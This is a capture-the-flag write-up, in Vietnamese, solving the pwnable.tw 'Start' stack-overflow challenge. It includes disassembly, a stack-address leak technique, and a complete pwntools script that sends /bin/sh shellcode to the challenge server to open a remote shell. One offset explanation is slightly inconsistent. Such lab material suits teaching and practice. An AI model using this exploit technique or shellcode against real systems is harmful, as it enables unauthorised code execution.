# Pwnable.tw — Start [100 pts]

**Dạng bài**: Binary Exploitation — Buffer Overflow / Stack Pivot (không cần leak địa chỉ code vì binary No PIE)
**Flag**: `FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}`

---

## 1. Khảo sát binary

```bash
file start
# start: ELF 32-bit LSB executable, Intel 80386, statically linked, not stripped

checksec start
# RELRO: No RELRO   Canary: No canary   NX: enabled (báo nhầm, thực ra RWX)   PIE: No PIE
```

Điểm quan trọng nhất: **No PIE** → mọi địa chỉ trong code (`0x8048xxx`) luôn cố định, không đổi giữa các lần chạy. Đây là lý do ta không cần leak địa chỉ code, chỉ cần leak địa chỉ **stack** (vì stack bị ASLR ngẫu nhiên hoá).

## 2. Disassemble

```bash
objdump -d -M intel start
```

```asm
08048060 <_start>:
 push   esp                  ; lưu ESP0 (giá trị ESP ban đầu) lên stack
 push   0x804809d             ; địa chỉ hàm _exit — dùng làm return address mặc định
 xor    eax,eax
 xor    ebx,ebx
 xor    ecx,ecx
 xor    edx,edx
 push   0x3a465443            ; 5 lệnh push = 20 byte, ghép lại thành chuỗi
 push   0x20656874            ; "Let's start the CTF:"
 push   0x20747261
 push   0x74732073
 push   0x2774654c
 mov    ecx,esp               ; ecx = A = địa chỉ đầu vùng 20 byte vừa push
 mov    dl,0x14
 mov    bl,0x1
 mov    al,0x4
 int    0x80                  ; write(1, A, 20)  -> in ra dòng chào
 xor    ebx,ebx
 mov    dl,0x3c                ; 0x3c = 60 (thập phân)!
 mov    al,0x3
 int    0x80                  ; read(0, A, 60)   <-- LỖ HỔNG
 add    esp,0x14
 ret

0804809d <_exit>:
 pop    esp
 xor    eax,eax
 inc    eax
 int    0x80                  ; exit(0)
```

## 3. Lỗ hổng

Vùng đệm chỉ được cấp phát **20 byte** (5 lệnh `push`), nhưng `read()` cho phép ghi tới **60 byte** vào đúng địa chỉ đó — không hề kiểm tra biên.

Gọi `A` là địa chỉ đầu buffer (giá trị `ecx`/`esp` tại thời điểm `mov ecx,esp`). Bố cục 60 byte:

| Offset | Trước khi bị tràn | Ý nghĩa |
|---|---|---|
| `A+0` .. `A+19` | chuỗi `"Let's start the CTF:"` | vùng đệm gốc |
| `A+20` .. `A+23` | `0x804809d` (`_exit`) | **sẽ bị `ret` dùng làm địa chỉ nhảy** |
| `A+24` .. `A+27` | `ESP0` | không bị `ret` dùng, nhưng liên quan tới kỹ thuật leak |
| `A+28` .. `A+59` | dữ liệu ngẫu nhiên trên stack | vùng trống, ta có thể đặt shellcode vào đây |

Sau lệnh `add esp,0x14; ret`: `esp` trỏ tới `A+20`, và `ret` lấy 4 byte tại đó làm địa chỉ nhảy. Vì ta kiểm soát toàn bộ 60 byte gửi lên → **ta kiểm soát hoàn toàn địa chỉ mà chương trình sẽ nhảy tới**.

## 4. Vấn đề: cần leak địa chỉ stack

Binary không có PIE nên code cố định, nhưng **stack bị ASLR** — ta không biết trước địa chỉ `A` để trỏ shellcode vào đúng chỗ. Cần một bước leak trước khi khai thác thật.

### Kỹ thuật: return về giữa hàm `_start` để chạy lại write/read

Địa chỉ `0x8048087` là lệnh `mov ecx,esp` — ngay sau phần push chuỗi, ngay trước `write`. Nếu ta trỏ return address về đây:

1. Payload 1 (60 byte): `20 byte đệm "A" + p32(0x8048087)`
2. Chương trình nhảy vào `0x8048087`, **chạy lại từ đó**: `ecx = esp` (esp lúc này = `A+24`, gọi là `B`) → `write(1, B, 20)` → in ra 20 byte tại `B` = `A+24`.
3. Byte tại `A+24` chính là giá trị **ESP0** đã được `push esp` lưu từ đầu chương trình (lần chạy đầu tiên) → **đây là địa chỉ stack bị leak ra**.
4. Chương trình tiếp tục chạy `read(0, B, 60)` — ta gửi payload 2 vào đây, ghi đè bắt đầu từ `B`.

### Tính toán offset cho payload 2

- Buffer của lần đọc thứ 2 bắt đầu tại `B = leak + 4` *(vì `B = ESP0 - 4`, mà giá trị leak được chính là `ESP0`)*
- Ô return address (offset 20 trong payload 2) nằm ở `B + 20 = leak + 4 + 20 - 4 = leak + 20` → `shellcode_addr = leak + 0x14`
- Shellcode đặt ngay sau địa chỉ đó, tại offset 24 trở đi trong payload 2

### Giới hạn quan trọng: vẫn chỉ được gửi tối đa 60 byte

```
20 byte đệm + 4 byte địa chỉ = 24 byte
→ chỉ còn tối đa 60 - 24 = 36 byte cho shellcode
```

Dùng shellcode `execve("/bin/sh")` kinh điển (23 byte) thay vì `shellcraft.sh()` của pwntools (~44-50 byte, sẽ bị cắt cụt và crash).

## 5. Exploit script

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.log_level = 'info'

WRITE_GADGET = 0x8048087   # mov ecx,esp ; ... ; write
HOST, PORT = 'chall.pwnable.tw', 10000

io = remote(HOST, PORT)

# --- Stage 1: overflow return address -> nhảy tới WRITE_GADGET ---
payload1 = b'A' * 20 + p32(WRITE_GADGET)
io.recvuntil(b'CTF:')
io.send(payload1)

# Đọc trọn 20 byte của write() để không để lại rác trong buffer
leak20 = io.recvn(20)
stack_leak = u32(leak20[:4])
log.info(f'Leaked stack address: {hex(stack_leak)}')

# --- Stage 2: trỏ return address vào shellcode ---
shellcode_addr = stack_leak + 0x14

shellcode = asm('''
    xor eax, eax
    push eax
    push 0x68732f2f    /* "//sh" */
    push 0x6e69622f    /* "/bin" */
    mov ebx, esp
    push eax
    mov edx, esp
    push ebx
    mov ecx, esp
    mov al, 0xb
    int 0x80
''')

payload2 = b'A' * 20 + p32(shellcode_addr) + shellcode
assert len(payload2) <= 60

io.send(payload2)
io.interactive()
```

## 6. Lấy flag

```
$ ls
bin  boot  dev  etc  home  ...
$ cat /home/start/flag
FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}
```

## 7. Bài học rút ra

1. **`read()`/`write()` không tự kiểm tra biên buffer** — bug kinh điển của C/assembly khi dev tự quản lý kích thước bằng tay (`edx = 0x3c` trong khi buffer chỉ 20 byte).
2. **No PIE + không canary + RWX stack** = combo lý tưởng để chạy shellcode trực tiếp trên stack mà không cần leak địa chỉ code.
3. **Stack vẫn có ASLR** dù binary No PIE — kỹ thuật "return vào giữa hàm để chạy lại chính syscall write" là cách kinh điển tự leak địa chỉ stack mà không cần lỗ hổng leak riêng biệt.
4. **Luôn để ý giới hạn kích thước buffer khi ghép payload nhiều giai đoạn** — dùng shellcode dài hơn khoảng trống cho phép sẽ khiến payload bị cắt cụt và chương trình crash âm thầm (không có thông báo lỗi rõ ràng, chỉ thấy "Got EOF").

---
*Tham khảo kỹ thuật: video "GEF 101 - Solving pwnable.tw/start" của [@_hugsy_](https://twitter.com/_hugsy_)*
